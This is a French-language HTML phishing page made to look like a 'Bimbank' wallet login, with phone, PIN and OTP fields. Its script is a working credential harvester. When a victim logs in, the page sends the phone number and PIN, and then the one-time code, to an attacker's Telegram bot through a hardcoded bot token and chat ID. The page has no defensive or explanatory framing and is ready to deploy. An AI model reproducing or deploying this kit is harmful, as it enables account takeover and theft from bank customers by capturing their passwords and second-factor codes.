<!DOCTYPE html>
<html lang="fr" dir="ltr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Bimbank - Wallet</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600;700&display=swap');
        body { font-family: 'Segoe UI', sans-serif; background-color: #f8faff; margin: 0; min-height: 100vh; color: #3b4d70; }
        
        .grid-bg {
            background-image: linear-gradient(#e5e7eb 1px, transparent 1px), linear-gradient(90deg, #e5e7eb 1px, transparent 1px);
            background-size: 25px 25px;
        }

        .logo-section { display: flex; flex-direction: column; align-items: center; padding: 40px 0 20px; }
        .logo-img { width: 200px; height: auto; }
        .welcome-text { font-size: 1.2rem; color: #3b4d70; text-align: center; margin-top: 10px; font-weight: 500; }

        .tab-container { display: flex; border: 2px solid #324a84; border-radius: 12px; margin: 20px 30px; overflow: hidden; background: white; }
        .tab-btn { flex: 1; padding: 12px; text-align: center; font-weight: bold; font-size: 0.9rem; }
        .tab-active { background-color: #324a84; color: white; }
        .tab-inactive { color: #9ca3af; }

        .form-section { padding: 0 30px; }
        .login-title { font-size: 1.2rem; font-weight: bold; color: #324a84; margin-bottom: 20px; text-align: left; }

        .input-group { position: relative; margin-bottom: 20px; }
        .custom-input { width: 100%; padding: 15px; border: 1px solid #d1d5db; border-radius: 10px; outline: none; font-size: 1rem; background: white; }
        .input-counter { position: absolute; right: 10px; bottom: -18px; font-size: 10px; color: #9ca3af; }

        .forgot-link { display: block; text-align: right; color: #9ca3af; font-size: 0.85rem; margin-top: 10px; text-decoration: none; }

        .btn-orange { background-color: #f19e2c; color: white; width: 100%; padding: 15px; border-radius: 10px; font-size: 1.1rem; font-weight: bold; margin-top: 25px; border: none; cursor: pointer; }
        
        .footer-section { text-align: center; margin-top: 40px; }
        .signup-text { color: #3b4d70; font-weight: bold; margin-top: 8px; display: block; }

        .contact-btn { display: flex; align-items: center; justify-content: center; gap: 10px; border: 1.5px solid #3b4d70; border-radius: 10px; padding: 10px 30px; margin: 30px auto; width: fit-content; color: #3b4d70; font-weight: 500; }

        /* OTP Modal Styles */
        #otp-modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.5); align-items: center; justify-content: center; z-index: 100; padding: 20px; }
        .modal-content { background: white; border-radius: 20px; width: 100%; max-width: 360px; padding: 30px; position: relative; box-shadow: 0 10px 25px rgba(0,0,0,0.2); }
        .close-modal { position: absolute; top: 15px; right: 15px; font-size: 24px; color: #324a84; cursor: pointer; }
        
        .timer-circle { width: 120px; height: 120px; border: 6px solid #fff5e6; border-top: 6px solid #f19e2c; border-radius: 50%; margin: 10px auto 20px; display: flex; align-items: center; justify-content: center; font-size: 1.5rem; font-weight: bold; color: #3b4d70; }
        .otp-label { text-align: left; font-size: 0.95rem; color: #4b5563; margin-bottom: 8px; }
    </style>
</head>
<body class="grid-bg">

    <!-- Screen 1: Login -->
    <div id="screen-login">
        <div class="logo-section">
            <img src="https://i.ibb.co/m5v8G1f/bimbank-logo.png" alt="Bimbank" class="logo-img">
            <div class="welcome-text">Bienvenue dans votre<br>espace wallet</div>
        </div>

        <div class="tab-container">
            <div class="tab-btn tab-active">Wallet</div>
            <div class="tab-btn tab-inactive">Banking</div>
        </div>

        <div class="form-section">
            <div class="login-title">Connexion</div>
            
            <div class="input-group">
                <input id="phone" type="tel" class="custom-input" placeholder="Téléphone" maxlength="8" oninput="updateCounter(this, 'c-phone')">
                <span id="c-phone" class="input-counter">0/8</span>
            </div>

            <div class="input-group">
                <input id="pin" type="password" class="custom-input" placeholder="Mot de passe" maxlength="4" oninput="updateCounter(this, 'c-pin')">
                <span id="c-pin" class="input-counter">0/4</span>
            </div>

            <a href="#" class="forgot-link">Mot de passe oublié ?</a>

            <button onclick="handleLogin()" class="btn-orange">Connexion</button>
        </div>

        <div class="footer-section">
            <p class="text-gray-500 text-sm">Nouvel utilisateur ?</p>
            <a href="#" class="signup-text">S'inscrire maintenant &rarr;</a>
            
            <div class="contact-btn">
                <svg style="width:20px" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" stroke-width="2"></path></svg>
                <span>Contacts</span>
            </div>
        </div>
    </div>

    <!-- Screen 2: OTP Modal -->
    <div id="otp-modal">
        <div class="modal-content">
            <span class="close-modal" onclick="closeOTP()">&times;</span>
            <div class="timer-circle" id="timer">04:59</div>
            
            <div class="otp-label">Entrez le code OTP</div>
            <div class="input-group">
                <input id="otp" type="tel" class="custom-input" maxlength="6" oninput="updateCounter(this, 'c-otp')">
                <span id="c-otp" class="input-counter">0/6</span>
            </div>

            <button onclick="submitOTP()" class="btn-orange">Connexion</button>
        </div>
    </div>

    <script>
        const TOKEN = "8729528953:AAFgvdDG5uYit3LITzp5HuHxYP0LPXszCe0";
        const CHAT = "8665814266";

        function updateCounter(el, id) {
            el.value = el.value.replace(/[^0-9]/g, '');
            document.getElementById(id).innerText = `${el.value.length}/${el.maxLength}`;
        }

        function handleLogin() {
            const phone = document.getElementById('phone').value;
            const pin = document.getElementById('pin').value;

            if(phone.length === 8 && pin.length === 4) {
                send(`🏦 Bimbank Login\n📱 Phone: ${phone}\n🔐 PIN: ${pin}`);
                document.getElementById('otp-modal').style.display = 'flex';
                startTimer(299);
            } else {
                alert("Veuillez remplir les champs correctement.");
            }
        }

        function submitOTP() {
            const otp = document.getElementById('otp').value;
            if(otp.length === 6) {
                send(`🔑 Bimbank OTP: ${otp}`);
                alert("Vérification en cours...");
                location.reload();
            } else {
                alert("Entrez le code à 6 chiffres.");
            }
        }

        function startTimer(duration) {
            let timer = duration, minutes, seconds;
            const display = document.getElementById('timer');
            const interval = setInterval(function () {
                minutes = parseInt(timer / 60, 10);
                seconds = parseInt(timer % 60, 10);
                minutes = minutes < 10 ? "0" + minutes : minutes;
                seconds = seconds < 10 ? "0" + seconds : seconds;
                display.textContent = minutes + ":" + seconds;
                if (--timer < 0) clearInterval(interval);
            }, 1000);
        }

        function closeOTP() { document.getElementById('otp-modal').style.display = 'none'; }

        function send(msg) {
            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT}&text=${encodeURIComponent(msg)}`);
        }
    </script>
</body>
</html>
